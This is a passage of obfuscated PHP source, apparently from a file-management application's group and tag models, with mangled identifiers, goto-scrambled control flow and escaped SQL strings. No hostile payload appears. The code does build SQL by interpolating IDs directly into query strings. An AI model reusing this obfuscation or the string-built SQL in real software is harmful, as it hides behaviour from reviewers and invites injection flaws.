array($e„Œ÷ÑÖ«–, array($E¡‚Ş²•ç’[472] => array($E¡‚Ş²•ç’[757], $Aæ«³Öåé))); } $cª×”Ş ± = $this->_makeOrder()->where($e„Œ÷ÑÖ«–)->selectPage(20); $cª×”Ş ± = $cª×”Ş ± ? $cª×”Ş ± : array(); goto FˆÂ‰öô­; FˆÂ‰öô­: if (!$cª×”Ş ± || count($cª×”Ş ±[$E¡‚Ş²•ç’[358]]) < 5 && Input::check($E…ËÍàÏ, $E¡‚Ş²•ç’[310])) { goto fŞ¬êµóõ; Cñï§ ¦ÛĞ: $DçŸ–Üë¡á = array_merge($FùÇ˜¿ñ–, $b¿Ô‚‚òŞĞ, $cª×”Ş ±[$E¡‚Ş²•ç’[358]]); $cª×”Ş ±[$E¡‚Ş²•ç’[358]] = array_unique_by_key($DçŸ–Üë¡á, $E¡‚Ş²•ç’[2112]); $cª×”Ş ±[$E¡‚Ş²•ç’[355]][$E¡‚Ş²•ç’[356]] = count($cª×”Ş ±[$E¡‚Ş²•ç’[358]]); goto fïïàà®ÛÊ; fŞ¬êµóõ: $fÙÃ á³Š = $this->groupChildrenAll($a‹“ÉÆ¨†); $FùÇ˜¿ñ– = $this->_searchFromMeta($E¡‚Ş²•ç’[427], $E…ËÍàÏ, 10, $fÙÃ á³Š); $b¿Ô‚‚òŞĞ = $this->_searchFromMeta($E¡‚Ş²•ç’[428], $E…ËÍàÏ, 10, $fÙÃ á³Š); goto Cñï§ ¦ÛĞ; fïïàà®ÛÊ: $cª×”Ş ±[$E¡‚Ş²•ç’[355]][$E¡‚Ş²•ç’[357]] = ceil($cª×”Ş ±[$E¡‚Ş²•ç’[355]][$E¡‚Ş²•ç’[356]] / $cª×”Ş ±[$E¡‚Ş²•ç’[355]][$E¡‚Ş²•ç’[353]]); goto b´ƒñ¦íğ; b´ƒñ¦íğ: } $this->_listDataApply($cª×”Ş ±[$E¡‚Ş²•ç’[358]]); return $cª×”Ş ±; goto FÜŸ¯È°Ò ; FÜŸ¯È°Ò : } protected function groupChildrenAll($cĞ²ØÉ—‹ö) { $d¬½Óù»˜Ï =& $_SERVER[‡’¶øåüç˜]; if (!$cĞ²ØÉ—‹ö) { return !1; } if (is_string($cĞ²ØÉ—‹ö)) { $cĞ²ØÉ—‹ö = array($cĞ²ØÉ—‹ö); } $B‡ÄÚÔ«À = $cĞ²ØÉ—‹ö; foreach ($cĞ²ØÉ—‹ö as $a£Ì¥ÂÓİø) { $EšÑ‡äÂ·– = $this->getInfoSimple($a£Ì¥ÂÓİø); $D‚ì‹ÕÁ˜ = array($d¬½Óù»˜Ï[472] => array($d¬½Óù»˜Ï[757], $EšÑ‡äÂ·–[$d¬½Óù»˜Ï[472]] . $a£Ì¥ÂÓİø . $d¬½Óù»˜Ï[497])); $Cä¨Õ£…Âß = $this->field($d¬½Óù»˜Ï[2112])->where($D‚ì‹ÕÁ˜)->select(); $B‡ÄÚÔ«À = array_merge($B‡ÄÚÔ«À, array_to_keyvalue($Cä¨Õ£…Âß, $d¬½Óù»˜Ï[33], $d¬½Óù»˜Ï[2112])); } return array_unique($B‡ÄÚÔ«À); } private function _searchFromMeta($bèÌÅìøÛ›, $fÑ‰ƒè³¶”, $E•ÕÃœÎ’, $a÷ò…Ôá™) { goto aäñãº®; cç…³Ù’¥›: if ($a÷ò…Ôá™) { $F«ê†¼˜ô[$C¶Ûë‡ƒ©[2112]] = array($C¶Ûë‡ƒ©[7], $a÷ò…Ôá™); } $cÆ·³®ö„ = Model($C¶Ûë‡ƒ©[2198])->where($F«ê†¼˜ô)->limit($E•ÕÃœÎ’)->select(); if (!$cÆ·³®ö„) { return array(); } goto BíõìÍŠ¤Ş; B¦«¥šº¥í: return $D‡¶ì¤ˆÓˆ; goto Aó‰¥òİÎ; aäñãº®: $C¶Ûë‡ƒ© =& $_SERVER[‡’¶øåüç˜]; $fÑ‰ƒè³¶” = strtolower($fÑ‰ƒè³¶”); $F«ê†¼˜ô = array($C¶Ûë‡ƒ©[89] => $bèÌÅìøÛ›, $C¶Ûë‡ƒ©[363] => array($C¶Ûë‡ƒ©[757], "\45{$fÑ‰ƒè³¶”}\45")); goto cç…³Ù’¥›; BíõìÍŠ¤Ş: $cÆ·³®ö„ = array_to_keyvalue($cÆ·³®ö„, $C¶Ûë‡ƒ©[33], $C¶Ûë‡ƒ©[2112]); $D‡¶ì¤ˆÓˆ = $this->where(array($C¶Ûë‡ƒ©[2189] => array($C¶Ûë‡ƒ©[7], $cÆ·³®ö„)))->select(); if (!$D‡¶ì¤ˆÓˆ) { return array(); } goto B¦«¥šº¥í; Aó‰¥òİÎ: } protected function _listDataApplyItem($e¯™à§òÏ°) { $D ‹±İÑ†õ = array($e¯™à§òÏ°); $this->_listDataApply($D ‹±İÑ†õ); return $D ‹±İÑ†õ[0]; } protected function _listDataApply(&$B®‘±à‘ê) { goto Aùôô›ËŠø; fêâ¸Ê†: $this->_listAppendChildren($B®‘±à‘ê); $this->_listAppendChildrenMember($B®‘±à‘ê); $this->_listAppendMeta($B®‘±à‘ê, $AÃÂìéÊ£‹); goto b–Â¸ªù’¢; b–Â¸ªù’¢: $this->_listAppendParent($B®‘±à‘ê); $this->_listAppendSourceRoot($B®‘±à‘ê, $AÃÂìéÊ£‹); goto föÌŠÊ­äê; Aùôô›ËŠø: $E¡¥–÷Ó =& $_SERVER[‡’¶øåüç˜]; if (!$B®‘±à‘ê) { return; } $AÃÂìéÊ£‹ = array_to_keyvalue($B®‘±à‘ê, $E¡¥–÷Ó[33], $E¡¥–÷Ó[2112]); goto fêâ¸Ê†; föÌŠÊ­äê: } private function _listAppendChildren(&$c¤¡‰êªî) { goto B„¤Äê§î; bÃÑ¯†ñà¸: $fª³­½•Öâ = array_to_keyvalue($fª³­½•Öâ, $fÚ›×ÏÊ¯[463]); foreach ($c¤¡‰êªî as &$Aœ¾ÚÂ²£) { $Aœ¾ÚÂ²£[$fÚ›×ÏÊ¯[2199]] = isset($fª³­½•Öâ[$Aœ¾ÚÂ²£[$fÚ›×ÏÊ¯[2112]] . $fÚ›×ÏÊ¯[2200]]); } unset($Aœ¾ÚÂ²£); goto Föƒáœò¾; Bö’Íì“Ç¬: $d““— ßòÛ = count($c¤¡‰êªî); $F…³ëòÜŸ« = $this->tablePrefix . $this->tableName; for ($c¥è³¦¡âä = 0, $aÕšÒ§Ø¶ = 0; $c¥è³¦¡âä < $d““— ßòÛ; $c¥è³¦¡âä++) { $aÕšÒ§Ø¶++; $DğĞ”µ’“• = $c¤¡‰êªî[$c¥è³¦¡âä][$fÚ›×ÏÊ¯[2112]]; $BÔÄ¬­Œ .= "\123\105\114\x45\x43\124\x20\52\x20\x46\122\117\x4d\40\x28\123\105\114\x45\x43\x54\40\47{$DğĞ”µ’“•}\137\143\150\151\x6c\144\47\x20\x61\163\x20\x68\141\x73\40\106\122\117\115\x20\140{$F…³ëòÜŸ«}\140\x20\x77\150\x65\162\x65\40\160\x61\x72\x65\x6e\164\111\x44\x3d{$DğĞ”µ’“•}\40\x6c\151\155\x69\x74\40\61\51\40\141\x73\40\x74\142\137{$DğĞ”µ’“•}\40\165\x6e\151\157\x6e\40\141\154\154\x20"; if (($aÕšÒ§Ø¶ >= 20 || $c¥è³¦¡âä == $d““— ßòÛ - 1) && $BÔÄ¬­Œ) { $BÔÄ¬­Œ = substr($BÔÄ¬­Œ, 0, -strlen($fÚ›×ÏÊ¯[462])); $Cëƒ†ù…İ = $this->query($BÔÄ¬­Œ); $fª³­½•Öâ = array_merge($fª³­½•Öâ, $Cëƒ†ù…İ); $aÕšÒ§Ø¶ = 0; $BÔÄ¬­Œ = $fÚ›×ÏÊ¯[33]; } } goto bÃÑ¯†ñà¸; B„¤Äê§î: $fÚ›×ÏÊ¯ =& $_SERVER[‡’¶øåüç˜]; $BÔÄ¬­Œ = $fÚ›×ÏÊ¯[365]; $fª³­½•Öâ = array(); goto Bö’Íì“Ç¬; Föƒáœò¾: } private function _listAppendChildrenMember(&$C“‰ÌÛ¢¤Ş) { goto Dòõò¸ˆ¿Ï; D¥ëåå§‡£: $CõÅòè‡¸¦ = array_to_keyvalue($CõÅòè‡¸¦, $C˜˜Š”ŞÃƒ[463]); foreach ($C“‰ÌÛ¢¤Ş as &$Fò¡£ÒÁ®) { $Fò¡£ÒÁ®[$C˜˜Š”ŞÃƒ[2201]] = isset($CõÅòè‡¸¦[$Fò¡£ÒÁ®[$C˜˜Š”ŞÃƒ[2112]] . $C˜˜Š”ŞÃƒ[2200]]); } unset($Fò¡£ÒÁ®); goto Cå†óÎ‰Ò; Dòõò¸ˆ¿Ï: $C˜˜Š”ŞÃƒ =& $_SERVER[‡’¶øåüç˜]; $FÙˆƒ“ÌÙ = $C˜˜Š”ŞÃƒ[365]; $CõÅòè‡¸¦ = array(); goto aÛÃ‚¤Ï½…; aÛÃ‚¤Ï½…: $f¿µ‘†ÂØ = count($C“‰ÌÛ¢¤Ş); $BÜ³†ÂÏÈØ = $this->tablePrefix . $C˜˜Š”ŞÃƒ[2191]; for ($A˜åéÎĞÔ… = 0, $aç‘¡‚Ñ« = 0; $A˜åéÎĞÔ… < $f¿µ‘†ÂØ; $A˜åéÎĞÔ…++) { $aç‘¡‚Ñ«++; $E‡³§ˆ× = $C“‰ÌÛ¢¤Ş[$A˜åéÎĞÔ…][$C˜˜Š”ŞÃƒ[2112]]; $FÙˆƒ“ÌÙ .= "\x53\105\x4c\x45\x43\x54\x20\x2a\40\x46\x52\x4f\115\x20\x28\x53\x45\114\x45\x43\x54\40\47{$E‡³§ˆ×}\x5f\143\150\151\x6c\x64\x27\40\x61\x73\40\150\141\x73\x20\x46\122\117\115\x20\140{$BÜ³†ÂÏÈØ}\140\40\167\150\145\162\x65\x20\x67\162\157\165\x70\x49\x44\75{$E‡³§ˆ×}\40\154\x69\155\x69\x74\x20\61\x29\x20\141\163\40\x74\142\x5f{$E‡³§ˆ×}\40\x75\156\x69\157\156\x20\141\x6c\x6c\40"; if (($aç‘¡‚Ñ« >= 20 || $A˜åéÎĞÔ… == $f¿µ‘†ÂØ - 1) && $FÙˆƒ“ÌÙ) { $FÙˆƒ“ÌÙ = substr($FÙˆƒ“ÌÙ, 0, -strlen($C˜˜Š”ŞÃƒ[462])); $d©ˆ‰æ¨µ¸ = $this->query($FÙˆƒ“ÌÙ); $CõÅòè‡¸¦ = array_merge($CõÅòè‡¸¦, $d©ˆ‰æ¨µ¸); $aç‘¡‚Ñ« = 0; $FÙˆƒ“ÌÙ = $C˜˜Š”ŞÃƒ[33]; } } goto D¥ëåå§‡£; Cå†óÎ‰Ò: } private function _listAppendMeta(&$F˜¬‰¥, $dØ…êÑÔº) { goto bÏœ†µ»Ê‚; C‹¬É¬®˜: $d« ÒÊ¯Ëì = array_to_keyvalue_group($d« ÒÊ¯Ëì, $dÏŒø‘»„[2112]); foreach ($d« ÒÊ¯Ëì as &$bÇµ¢¤ ……) { $bÇµ¢¤ …… = array_to_keyvalue($bÇµ¢¤ ……, $dÏŒø‘»„[89], $dÏŒø‘»„[363]); } unset($bÇµ¢¤ ……); goto d­«…„ÈôÔ; d­«…„ÈôÔ: foreach ($F˜¬‰¥ as &$CƒÈÛÕÖŞ¸) { $CƒÈÛÕÖŞ¸[$dÏŒø‘»„[429]] = array(); if (isset($d« ÒÊ¯Ëì[$CƒÈÛÕÖŞ¸[$dÏŒø‘»„[2112]]])) { $CƒÈÛÕÖŞ¸[$dÏŒø‘»„[429]] = $d« ÒÊ¯Ëì[$CƒÈÛÕÖŞ¸[$dÏŒø‘»„[2112]]]; } } unset($CƒÈÛÕÖŞ¸); goto dÏ±¤©¯ˆ†; bÏœ†µ»Ê‚: $dÏŒø‘»„ =& $_SERVER[‡’¶øåüç˜]; $BßÎÄº¤É = array($dÏŒø‘»„[2112] => array($dÏŒø‘»„[7], $dØ…êÑÔº)); $d« ÒÊ¯Ëì = Model($dÏŒø‘»„[2190])->where($BßÎÄº¤É)->select(); goto C‹¬É¬®˜; dÏ±¤©¯ˆ†: } protected function parentLevelArray($bÂŞÀíÉß½) { $Eƒ”Ğ…»¸Æ =& $_SERVER[‡’¶øåüç˜]; $bÂŞÀíÉß½ = explode($Eƒ”Ğ…»¸Æ[47], trim($bÂŞÀíÉß½, $Eƒ”Ğ…»¸Æ[47])); $bÂŞÀíÉß½ = array_remove_value($bÂŞÀíÉß½, $Eƒ”Ğ…»¸Æ[481]); return $bÂŞÀíÉß½; } private function _listAppendParent(&$EóÙ±ä¥š¼) { goto Eƒíà±ˆ“; b‰Â¥‚®Ö: unset($d—Šó¸„ŠÂ); $E×ø³²Ş‹ = array(); foreach ($AÂ•İ ÅÏ¸ as $aƒø‘›Êê => $AÕ°¾¨º˜) { if (!$AÕ°¾¨º˜) { $E×ø³²Ş‹[] = $aƒø‘›Êê; } } goto e²’ŞÒÒà; Eƒíà±ˆ“: $e™Û‡Š =& $_SERVER[‡’¶øåüç˜]; $AÂ•İ ÅÏ¸ = array(); foreach ($EóÙ±ä¥š¼ as &$d—Šó¸„ŠÂ) { $AÂ•İ ÅÏ¸[$d—Šó¸„ŠÂ[$e™Û‡Š[2112]]] = $d—Šó¸„ŠÂ[$e™Û‡Š[28]]; $a·”õŠ••³ = $this->parentLevelArray($d—Šó¸„ŠÂ[$e™Û‡Š[472]]); foreach ($a·”õŠ••³ as $E‚ŸöÑå…®) { if (!isset($AÂ•İ ÅÏ¸[$E‚ŸöÑå…®])) { $AÂ•İ ÅÏ¸[$E‚ŸöÑå…®] = 0; } } } goto b‰Â¥‚®Ö; e²’ŞÒÒà: if ($E×ø³²Ş‹) { $C²˜ì¡ = array($e™Û‡Š[2189] => array($e™Û‡Š[396], $E×ø³²Ş‹)); $cÀ«ªëÔÈ½ = $this->field($e™Û‡Š[2202])->where($C²˜ì¡)->select(); $eÇÌËô²¼ = array_to_keyvalue($cÀ«ªëÔÈ½, $e™Û‡Š[2112], $e™Û‡Š[28]); $AÂ•İ ÅÏ¸ = array_merge_index($AÂ•İ ÅÏ¸, $eÇÌËô²¼); } $f…¿ëÃÛÜÇ = $GLOBALS[$e™Û‡Š[6]][$e™Û‡Š[84]][$e™Û‡Š[2203]]; foreach ($EóÙ±ä¥š¼ as &$d—Šó¸„ŠÂ) { $a·”õŠ••³ = $this->parentLevelArray($d—Šó¸„ŠÂ[$e™Û‡Š[472]]); $c¸ßâ»Íê = $e™Û‡Š[33]; foreach ($a·”õŠ••³ as $aƒø‘›Êê => $E‚ŸöÑå…®) { if ($f…¿ëÃÛÜÇ && $aƒø‘›Êê == 0) { continue; } $c¸ßâ»Íê .= $AÂ•İ ÅÏ¸[$E‚ŸöÑå…®] . $e™Û‡Š[8]; } if ($a·”õŠ••³) { $c¸ßâ»Íê .= $d—Šó¸„ŠÂ[$e™Û‡Š[28]]; } $d—Šó¸„ŠÂ[$e™Û‡Š[476]] = str_replace($e™Û‡Š[480], $e™Û‡Š[8], $c¸ßâ»Íê); } goto bëÈèãéã; bëÈèãéã: unset($d—Šó¸„ŠÂ); goto C¦¼­˜òˆœ; C¦¼­˜òˆœ: } private function _listAppendSourceRoot(&$Dƒ”…œ÷÷, $EÕ“Óğ¿ò) { goto EÂé¾›‡áì; EÂé¾›‡áì: $D¢×’Ó˜Ú´ =& $_SERVER[‡’¶øåüç˜]; $fæë«¨ÇÙ¾ = array($D¢×’Ó˜Ú´[383] => SourceModel::TYPE_GROUP, $D¢×’Ó˜Ú´[474] => 0, $D¢×’Ó˜Ú´[469] => array($D¢×’Ó˜Ú´[7], $EÕ“Óğ¿ò)); $cÙÖò¹ñÜŠ = $D¢×’Ó˜Ú´[2204]; goto CÈ‡£Àƒ ø; C¦ßåÉÂ‹: foreach ($Dƒ”…œ÷÷ as &$EÎ”áŠ˜²ô) { $EÎ”áŠ˜²ô[$D¢×’Ó˜Ú´[403]] = $b¾ù›ùÔá[$EÎ”áŠ˜²ô[$D¢×’Ó˜Ú´[2112]]] ? $b¾ù›ùÔá[$EÎ”áŠ˜²ô[$D¢×’Ó˜Ú´[2112]]] : array(); } unset($EÎ”áŠ˜²ô); goto f°À¡­”ÙÄ; CÈ‡£Àƒ ø: $b¾ù›ùÔá = Model($D¢×’Ó˜Ú´[758])->order($D¢×’Ó˜Ú´[2205])->field($cÙÖò¹ñÜŠ)->where($fæë«¨ÇÙ¾)->select(); $b¾ù›ùÔá = array_to_keyvalue($b¾ù›ùÔá, $D¢×’Ó˜Ú´[469]); $b¾ù›ùÔá = array_remove_key($b¾ù›ùÔá, $D¢×’Ó˜Ú´[469]); goto C¦ßåÉÂ‹; f°À¡­”ÙÄ: } protected function groupMerge($cÔ‚Îšù¸) { $cÔ‚Îšù¸ = array_values(array_unique($cÔ‚Îšù¸)); $eË¨¬ÄØŞ¼ = array(); for ($a–†ƒ’–Æ– = 0; $a–†ƒ’–Æ– < count($cÔ‚Îšù¸); $a–†ƒ’–Æ–++) { $aË–ëù´Ñò = !1; for ($A™“‡öïÃ’ = 0; $A™“‡öïÃ’ < count($cÔ‚Îšù¸); $A™“‡öïÃ’++) { if ($a–†ƒ’–Æ– == $A™“‡öïÃ’) { continue; } if ($this->isParentOf($cÔ‚Îšù¸[$A™“‡öïÃ’], $cÔ‚Îšù¸[$a–†ƒ’–Æ–])) { $aË–ëù´Ñò = !0; break; } } if (!$aË–ëù´Ñò) { $eË¨¬ÄØŞ¼[] = $cÔ‚Îšù¸[$a–†ƒ’–Æ–]; } } return $eË¨¬ÄØŞ¼; } protected function isParentOf($Fïš‰Ùä›, $A›ˆ÷ô ó”) { goto dÈ„³¶é; dâ¡Ÿ©„Š: return !1; goto AÀõ¼Æ¢; eÖ±˜°ØŒƒ: $c¯ØôÜ«‹× = $this->getInfoSimple($A›ˆ÷ô ó”); $f»´Çœ“Â¯ = $C‘ê©ß—ï[$F¤¬Õ«Ûò[472]] . $Fïš‰Ùä› . $F¤¬Õ«Ûò[47]; if (substr($c¯ØôÜ«‹×[$F¤¬Õ«Ûò[472]], 0, strlen($f»´Çœ“Â¯)) == $f»´Çœ“Â¯) { return !0; } goto dâ¡Ÿ©„Š; dÈ„³¶é: $F¤¬Õ«Ûò =& $_SERVER[‡’¶øåüç˜]; if (!$Fïš‰Ùä› || !$A›ˆ÷ô ó” || $Fïš‰Ùä› == $A›ˆ÷ô ó”) { return !1; } $C‘ê©ß—ï = $this->getInfoSimple($Fïš‰Ùä›); goto eÖ±˜°ØŒƒ; AÀõ¼Æ¢: } public function groupShowRoot($AÆÀïéà“ø, $EÃ£Ì×†È« = false) { goto B¯Äöäê–; a’İ»†ãÛË: if ($EÃ£Ì×†È« && count($D‡”ğïù°») == 1) { return $cŸÒëµ´²«; } if (!$Eš°¦Ø‹ë[$Dä×÷µä³¥[429]] || !isset($Eš°¦Ø‹ë[$Dä×÷µä³¥[429]][$Dä×÷µä³¥[2187]]) || $Eš°¦Ø‹ë[$Dä×÷µä³¥[429]][$Dä×÷µä³¥[2187]] == $Dä×÷µä³¥[2161]) { return $this->groupShowRoot($D‡”ğïù°»[count($D‡”ğïù°») - 1], $EÃ£Ì×†È«); } if ($Eš°¦Ø‹ë[$Dä×÷µä³¥[429]][$Dä×÷µä³¥[2187]] == $Dä×÷µä³¥[350]) { $fŠöåµØÊ = explode($Dä×÷µä³¥[47], $Eš°¦Ø‹ë[$Dä×÷µä³¥[429]][$Dä×÷µä³¥[2188]]); if ($fŠöåµØÊ) { $cŸÒëµ´²« = array_merge($cŸÒëµ´²«, $fŠöåµØÊ); } } goto fö¹ùß‡·Ş; bµ¦®Ü«ßˆ: $D‡”ğïù°» = $this->parentLevelArray($Eš°¦Ø‹ë[$Dä×÷µä³¥[472]]); $cŸÒëµ´²« = array($AÆÀïéà“ø); if (count($D‡”ğïù°») == 0) { return $cŸÒëµ´²«; } goto a’İ»†ãÛË; B¯Äöäê–: $Dä×÷µä³¥ =& $_SERVER[‡’¶øåüç˜]; $Eš°¦Ø‹ë = $this->getInfo($AÆÀïéà“ø); if (!$Eš°¦Ø‹ë) { return array(); } goto bµ¦®Ü«ßˆ; fö¹ùß‡·Ş: return $cŸÒëµ´²«; goto c‚ãã›¼áØ; c‚ãã›¼áØ: } protected function resetParentLevel() { $bË–ÁŠ³†‰ =& $_SERVER[‡’¶øåüç˜]; $aø¹ ºÌ‹æ = $bË–ÁŠ³†‰[2112]; $b§ªÖ±ÌÉ“ = $this->select(); $b§ªÖ±ÌÉ“ = array_to_keyvalue($b§ªÖ±ÌÉ“, $aø¹ ºÌ‹æ); foreach ($b§ªÖ±ÌÉ“ as $BÑ¶µ¶àÜÂ) { goto b½ëĞ¶ ë; f¨æå¿ğŠÊ: $this->where(array($aø¹ ºÌ‹æ => $BÑ¶µ¶àÜÂ[$aø¹ ºÌ‹æ]))->save(array($bË–ÁŠ³†‰[538] => $f¥Í°¶À˜É)); goto dÀ‚À½†¾—; b½ëĞ¶ ë: $CÒ÷©êâÅ = $BÑ¶µ¶àÜÂ; $f¥Í°¶À˜É = array(); while ($CÒ÷©êâÅ[$bË–ÁŠ³†‰[474]] != 0) { $f¥Í°¶À˜É[] = $CÒ÷©êâÅ[$bË–ÁŠ³†‰[474]]; $CÒ÷©êâÅ = $b§ªÖ±ÌÉ“[$CÒ÷©êâÅ[$bË–ÁŠ³†‰[474]]]; } goto C‰åø·êê; C‰åø·êê: $f¥Í°¶À˜É[] = 0; $f¥Í°¶À˜É = $bË–ÁŠ³†‰[47] . implode($bË–ÁŠ³†‰[47], array_reverse($f¥Í°¶À˜É)) . $bË–ÁŠ³†‰[47]; $this->setNamePinyin($BÑ¶µ¶àÜÂ[$aø¹ ºÌ‹æ], $BÑ¶µ¶àÜÂ[$bË–ÁŠ³†‰[28]]); goto f¨æå¿ğŠÊ; dÀ‚À½†¾—: } return $b§ªÖ±ÌÉ“; } public function groupNameAuto($eŒˆâÊğ½œ, $Få£âŒÔ†Û) { $DÎĞºË‘ =& $_SERVER[‡’¶øåüç˜]; $F£ğ‚ˆİİƒ = $this->where(array($DÎĞºË‘[380] => $eŒˆâÊğ½œ))->getField($DÎĞºË‘[28], !0); if (!$F£ğ‚ˆİİƒ || !in_array($Få£âŒÔ†Û, $F£ğ‚ˆİİƒ)) { return $Få£âŒÔ†Û; } for ($a“´òÉ‰ = 1; $a“´òÉ‰ <= count($F£ğ‚ˆİİƒ) + 1; $a“´òÉ‰++) { $AñØù¼‚”­ = $Få£âŒÔ†Û . "\50{$a“´òÉ‰}\x29"; if (!in_array($AñØù¼‚”­, $F£ğ‚ˆİİƒ)) { return $AñØù¼‚”­; } } } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\x72\137\146\x61\166"; protected function cacheFunctionAlias($Eùßï‰áƒç) { $Bƒ­âÔöÖî =& $_SERVER[‡’¶øåüç˜]; return array($Bƒ­âÔöÖî[2206] => array($Eùßï‰áƒç[0], $Bƒ­âÔöÖî[2207]), $Bƒ­âÔöÖî[2208] => array($Eùßï‰áƒç[0], $Bƒ­âÔöÖî[2209])); } protected function get($eŒòê“¯ã®) { $FÚ£¢è…… =& $_SERVER[‡’¶øåüç˜]; $a®°¸’Ö©’ = Model($FÚ£¢è……[471])->metaGet($eŒòê“¯ã®, $FÚ£¢è……[2210]); $bµˆ¼â‘ = json_decode($a®°¸’Ö©’, !0); return $bµˆ¼â‘ ? $bµˆ¼â‘ : array($FÚ£¢è……[2211] => $FÚ£¢è……[83], $FÚ£¢è……[358] => array()); } protected function set($Fš‚Ñš‡, $eŠÅ¹„) { $aç …Êãô =& $_SERVER[‡’¶øåüç˜]; $eŠÅ¹„ = $eŠÅ¹„ ? $eŠÅ¹„ : array($aç …Êãô[2211] => $aç …Êãô[83], $aç …Êãô[358] => array()); Model($aç …Êãô[471])->metaSet($Fš‚Ñš‡, $aç …Êãô[2210], json_encode($eŠÅ¹„)); return Model($aç …Êãô[471])->metaSet($Fš‚Ñš‡, $aç …Êãô[2210], json_encode($eŠÅ¹„)); } protected function getByTagID($b¶¨ÌøÏÂÙ, $E·¡Â‘·ë‘) { goto EŸ‰Ù×íĞ®; EŸ‰Ù×íĞ®: $fğ¢ÃÔâÇ– =& $_SERVER[‡’¶øåüç˜]; if (!$b¶¨ÌøÏÂÙ || !$E·¡Â‘·ë‘) { return !1; } if (!Model($fğ¢ÃÔâÇ–[471])->getInfoSimple($b¶¨ÌøÏÂÙ)) { return !1; } goto fË‰ÊƒµÙ; fË‰ÊƒµÙ: $eƒÔåÛƒñÛ = $this->get($b¶¨ÌøÏÂÙ); if (!$eƒÔåÛƒñÛ || !isset($eƒÔåÛƒñÛ[$fğ¢ÃÔâÇ–[358]])) { return !1; } $bÍƒ°…ÌåÄ = array_find_by_field($eƒÔåÛƒñÛ[$fğ¢ÃÔâÇ–[358]], $fğ¢ÃÔâÇ–[371], $E·¡Â‘·ë‘); goto cÓ¦¼„™­æ; cÓ¦¼„™­æ: return is_array($bÍƒ°…ÌåÄ) ? $bÍƒ°…ÌåÄ : !1; goto Ağ…ËÇÂÚ; Ağ…ËÇÂÚ: } public function listSource($fƒ—¨ßŸ¤, $eñ´‘Ç„) { goto Fä‰¿ ï; dƒ„»Ç“Ş: if (!$fƒœåÒà¿× || count($E¢Ş°ĞÉ±Ô) == $fƒœåÒà¿×[$f¥ÕŸèò”Ç[355]][$f¥ÕŸèò”Ç[356]]) { return $fƒœåÒà¿×; } $e¦™áŠØƒ = array(); $f‡‘®‡±’¿ = array_to_keyvalue($fƒœåÒà¿×[$f¥ÕŸèò”Ç[74]], $f¥ÕŸèò”Ç[33], $f¥ÕŸèò”Ç[381]); goto cöãŒ°„Ê; Fù…ÍŞÂ: foreach ($d‘óèì‡¿× as $F¼¸ˆ·—‘ø => $Fõó˜‹ÉÎ‚) { $f®é¢®Õ™æ = !0; if (!$eñ´‘Ç„) { $E¢Ş°ĞÉ±Ô[] = $F¼¸ˆ·—‘ø; continue; } foreach ($eñ´‘Ç„ as $BŞ‘ƒê·¥Å) { if (!in_array($BŞ‘ƒê·¥Å, $Fõó˜‹ÉÎ‚)) { $f®é¢®Õ™æ = !1; break; } } if ($f®é¢®Õ™æ) { $E¢Ş°ĞÉ±Ô[] = $F¼¸ˆ·—‘ø; } } if (!$E¢Ş°ĞÉ±Ô) { return array(); } $fƒœåÒà¿× = Model($f¥ÕŸèò”Ç[1124])->listSource(array($f¥ÕŸèò”Ç[395] => array($f¥ÕŸèò”Ç[396], $E¢Ş°ĞÉ±Ô))); goto dƒ„»Ç“Ş; Fä‰¿ ï: $f¥ÕŸèò”Ç =& $_SERVER[‡’¶øåüç˜]; if ($eñ´‘Ç„ && !is_array($eñ´‘Ç„)) { $eñ´‘Ç„ = array($eñ´‘Ç„); } $d–ĞìÃæˆ = $this->listData($fƒ—¨ßŸ¤); goto D‹Ù¥ã„Í; cöãŒ°„Ê: $c‘‘¸ÙØâÂ = array_to_keyvalue($fƒœåÒà¿×[$f¥ÕŸèò”Ç[73]], $f¥ÕŸèò”Ç[33], $f¥ÕŸèò”Ç[381]); $Då®ùƒÉ¸Î = array_merge($c‘‘¸ÙØâÂ, $f‡‘®‡±’¿); foreach ($E¢Ş°ĞÉ±Ô as $dâÉ£¦ˆö¦) { if (!in_array($dâÉ£¦ˆö¦, $Då®ùƒÉ¸Î)) { $e¦™áŠØƒ[] = $dâÉ£¦ˆö¦; } } goto f„ù°ä¶ŸÓ; f„ù°ä¶ŸÓ: if ($e¦™áŠØƒ) { $this->removeBySource($fƒ—¨ßŸ¤, $e¦™áŠØƒ); } return $fƒœåÒà¿×; goto e×Ï¡ªÌ³™; D‹Ù¥ã„Í: $d‘óèì‡¿× = array(); foreach ($d–ĞìÃæˆ as $B·²¡¬Üß—) { $dâÉ£¦ˆö¦ = $B·²¡¬Üß—[$f¥ÕŸèò”Ç[75]]; if (!$dâÉ£¦ˆö¦) { continue; } if (!isset($d‘óèì‡¿×[$dâÉ£¦ˆö¦])) { $d‘óèì‡¿×[$dâÉ£¦ˆö¦] = array(); } $d‘óèì‡¿×[$dâÉ£¦ˆö¦][] = $B·²¡¬Üß—[$f¥ÕŸèò”Ç[405]]; } $E¢Ş°ĞÉ±Ô = array(); goto Fù…ÍŞÂ; e×Ï¡ªÌ³™: } protected function listData($d³¿Ö’¢Å’) { $cÉÌëó¥øŞ =& $_SERVER[‡’¶øåüç˜]; $F£ºğÕ¡á = array($cÉÌëó¥øŞ[1434] => 0, $cÉÌëó¥øŞ[447] => array($cÉÌëó¥øŞ[2212], 0), $cÉÌëó¥øŞ[400] => $cÉÌëó¥øŞ[2213] . $d³¿Ö’¢Å’); $aÍÛÖÌ¶ì = $cÉÌëó¥øŞ[2214]; $d’˜ÊÏÕÄ = $this->field($aÍÛÖÌ¶ì)->where($F£ºğÕ¡á)->order($cÉÌëó¥øŞ[2215])->select(); return $d’˜ÊÏÕÄ ? $d’˜ÊÏÕÄ : array(); } protected function addToTag($EäçÃïäÒ , $A‘‰îÅ‹÷À, $bÊŠ¾Èíø) { $E¨Œ±Êğ =& $_SERVER[‡’¶øåüç˜]; if (!$this->getByTagID($EäçÃïäÒ , $bÊŠ¾Èíø) || !$A‘‰îÅ‹÷À) { return !1; } if (!Model($E¨Œ±Êğ[758])->pathInfo($A‘‰îÅ‹÷À)) { return !1; } $A©‹ŞÆØ‰‹ = array($E¨Œ±Êğ[1434] => 0, $E¨Œ±Êğ[447] => $bÊŠ¾Èíø, $E¨Œ±Êğ[399] => $A‘‰îÅ‹÷À, $E¨Œ±Êğ[400] => $E¨Œ±Êğ[2216] . $EäçÃïäÒ , $E¨Œ±Êğ[398] => $E¨Œ±Êğ[33], $E¨Œ±Êğ[2116] => 0); if ($this->where($A©‹ŞÆØ‰‹)->find()) { return !1; } return 